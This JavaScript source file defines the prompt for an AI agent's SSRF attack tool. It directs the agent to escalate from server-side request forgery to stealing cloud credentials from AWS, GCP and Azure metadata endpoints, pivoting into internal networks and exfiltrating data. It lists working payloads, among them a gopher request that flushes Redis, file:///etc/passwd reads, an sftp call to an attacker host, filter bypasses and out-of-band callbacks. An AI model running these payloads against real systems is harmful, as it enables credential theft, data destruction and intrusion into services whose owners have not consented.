import { SSRF_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `Advanced SSRF (Server-Side Request Forgery) prober — tests internal endpoints, OOB callbacks, filter bypasses, cloud metadata, and protocol handlers.`

export const PROMPT = `## ${SSRF_TOOL_NAME} — Advanced SSRF Probing → Cloud Credential Theft → Internal Network Pivot

### ESCALATION RULE — SSRF is only valuable if you pivot:
1. action=scan → identify SSRF parameter (any URL/src/redirect param that makes server-side requests)
2. action=probe target=http://169.254.169.254/latest/meta-data/ → AWS IMDSv1 metadata access
   - If AWS: retrieve /latest/meta-data/iam/security-credentials/<role> → keys + session token
   - If GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (Metadata-Flavor: Google)
   - If Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true header)
3. Probe internal services: Redis :6379, Memcached :11211, Elasticsearch :9200, Kubernetes API :6443/:8443
4. Read internal HTTP responses to map the internal network
Goal: cloud credentials, internal service access, or data exfiltration. Simple SSRF confirmation is not enough.

### Protocol escalation (when http:// is filtered):
- dict://127.0.0.1:6379/info → Redis info via DICT protocol
- file:///etc/passwd → local file read via FILE protocol
- gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall → Redis command injection via Gopher
- gopher://127.0.0.1:11211/ → Memcached via Gopher
- sftp://attacker.com:11111/ → potential credential leak

### Actions
- \`probe\` — send a single SSRF probe to a specific internal target
- \`scan\` — automatically test common internal targets (metadata, localhost, internal IPs)
- \`bypass\` — test filter bypass techniques for a blocked target
- \`oob\` — out-of-band SSRF test with DNS/HTTP callback URL

### Bypass techniques tested
- IPv4 decimal (2130706433 = 127.0.0.1)
- IPv6 (::1, 0:0:0:0:0:ffff:7f00:1)
- URL encoding (%31%32%37%2e%30%2e%30%2e%31)
- DNS rebinding patterns
- http://localhost, http://0.0.0.0
- http://metadata.google.internal (GCP)
- http://169.254.169.254 (AWS/Azure metadata)

### Common internal targets
- http://localhost:80, :8080, :8443
- http://127.0.0.1:22, :3306, :5432, :6379, :27017
- http://169.254.169.254/latest/meta-data/ (AWS)
- http://metadata.google.internal/computeMetadata/v1/ (GCP)
- http://169.254.169.254/metadata/instance (Azure)
- http://10.0.0.1:9200/_cat/indices (Elasticsearch — often no auth)
- http://10.0.0.1:6443/api/v1/namespaces (Kubernetes — service account token may auto-auth)

### Examples
- \`{ url: "https://target.com/fetch?url=INJECT", action: "scan" }\`
- \`{ url: "https://target.com/fetch?url=INJECT", target: "http://169.254.169.254", action: "probe" }\`
- \`{ url: "https://target.com/fetch?url=INJECT", target: "http://127.0.0.1", action: "bypass" }\`
- \`{ url: "https://target.com/fetch?url=INJECT", action: "oob", oob_url: "http://callback.burpcollaborator.net" }\`
`
